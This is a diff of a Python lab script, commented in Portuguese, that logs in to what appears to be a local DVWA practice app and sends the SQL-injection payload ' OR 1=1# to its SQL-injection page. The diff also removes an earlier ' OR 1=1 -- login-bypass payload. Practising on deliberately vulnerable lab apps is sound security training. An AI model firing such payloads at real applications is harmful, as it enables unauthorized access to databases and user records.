@@ -26,14 +26,30 @@ user_token = token_extractor("http://localhost/login.php", "user_token", session
 
 # Monta o dicionário de login
 dictionary_login = {
-    "username": "' OR 1=1 -- ",
-    "password": "' OR 1=1 -- ",
+    "username": "admin",
+    "password": "password",
     "user_token": f"{user_token}",
     "Login": "Login"
 }
 
+dictionary_sql_injection = {
+    "id" : "' OR 1=1#",
+    "Submit" : "Submit"
+}
+
+def get_user_id(url, dictionary_sql_injection, session):
+    """Realiza o GET com SQL Injection e retorna o response."""
+    try:
+        response = session.get(url, data=dictionary_sql_injection)
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"An error occurred: {e}")
+        return
+
+
 # Realiza o login
 resposta = login_test("http://localhost/login.php", dictionary_login, session_actual)
+resposta = get_user_id("http://localhost/vulnerabilities/sqli/", dictionary_sql_injection, session_actual)
 
 # Exibe o HTML retornado
 print(resposta.text)
